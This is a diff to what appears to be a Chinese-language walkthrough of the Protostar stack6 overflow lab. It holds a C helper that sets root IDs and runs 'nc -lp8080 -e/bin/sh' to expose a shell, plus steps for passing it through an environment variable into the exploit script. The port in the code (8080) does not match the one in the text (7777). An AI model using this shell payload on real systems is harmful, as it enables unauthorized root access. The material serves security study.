@@ -176,21 +176,41 @@ stack6.py 的脚本如下：
 
 \#include &lt;stdlib.h&gt;
 
-
-
 int main\(int argc, char \*\*argv, char \*\*envp\) {
 
-    setuid\(0\); // These two are necessary, as system\(\) drops privileges
+```
+setuid\(0\); // These two are necessary, as system\(\) drops privileges
 
-    setgid\(0\);
+setgid\(0\);
 
-    char \*args\[\] = {  "nc", "-lp8080", "-e/bin/sh", \(char \*\) 0 };
+char \*args\[\] = {  "nc", "-lp8080", "-e/bin/sh", \(char \*\) 0 };
 
-    execve\("/bin/nc", args, envp\);
+execve\("/bin/nc", args, envp\);
+```
 
 }
 
+在/tmp目录下运行得到nc
 
+设置环境变量 RUN
+
+export RUN=///////////////////tmp/nc
+
+利用上面取环境变脸地址的程序/tmp/addr RUN ./stack6获取环境变量地址
+
+然后修改stack6.py脚本地址就可以了。
+
+在kali下监听7777端口，成功。
+
+nc.c
+
+![](/png/39.png)
+
+利用addr获取变量run地址
+
+![](/png/38.png)
+
+![](/png/37.png)
 
 ref：
 
